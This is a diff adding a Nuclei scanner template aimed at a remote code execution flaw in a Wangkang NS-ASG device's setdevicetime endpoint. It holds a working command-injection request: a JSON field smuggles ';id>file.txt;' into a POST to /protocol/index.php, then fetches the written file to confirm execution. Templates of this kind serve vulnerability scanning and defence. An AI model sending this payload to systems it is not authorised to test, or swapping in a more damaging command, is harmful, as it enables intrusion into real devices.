@@ -1,0 +1,45 @@
+id: wangkang-NS-ASG-setdevicetime-rce
+
+info:
+  name: wangkang-NS-ASG-setdevicetime-rce
+  author: HuanXiong
+  severity: critical
+  tags: wangkang
+  
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /protocol/index.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Content-Length: 80
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+        Ua-Cpu: AMD64
+
+        jsoncontent={"protocolType":"setdevicetime","messagecontent":"1 ;id>{{username}}.txt;"}
+        
+
+      - |
+        GET /protocol/{{username}}.txt HTTP/1.1
+        Host:{{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko
+        Accept: text/html, application/xhtml+xml, image/jxr, */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-Hans-CN,zh-Hans;q=0.8,en-IE;q=0.6,en-US;q=0.4,en;q=0.2
+        Connection: keep-alive
+        Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
+        Ua-Cpu: AMD64
+        
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body, 'uid=')" 
